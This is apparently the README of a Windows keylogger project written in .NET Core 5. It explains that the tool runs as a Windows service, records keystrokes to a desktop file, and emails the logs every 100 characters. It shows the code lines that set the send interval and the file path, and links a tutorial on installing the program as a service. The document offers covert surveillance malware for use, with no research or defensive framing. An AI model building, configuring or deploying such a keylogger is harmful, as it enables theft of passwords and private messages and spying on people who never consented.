# Windows-Key-Logger-Service
Windows keylogger service (can store logs in file directory and send this data on email )

Written using â.net core5â. Very simple to use, just add your email's and SMTP port in SendEmailMessage method.

Every 100 characters send logs on email, you can change this by replacing condition on last âifâ operator (Worker.cs)


`
                        if (KeyCounter % 100 == 0) // When you need to send log (in this case every 100 char's)`

If you want to change directory for file, do it in 

`var fileDirectory= Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // File directory`

## Install FAQ

To compile this to Windows service, watch YouTube tutorial [CLICK](https://www.youtube.com/watch?v=y64L-3HKuP0&ab_channel=IAmTimCorey)
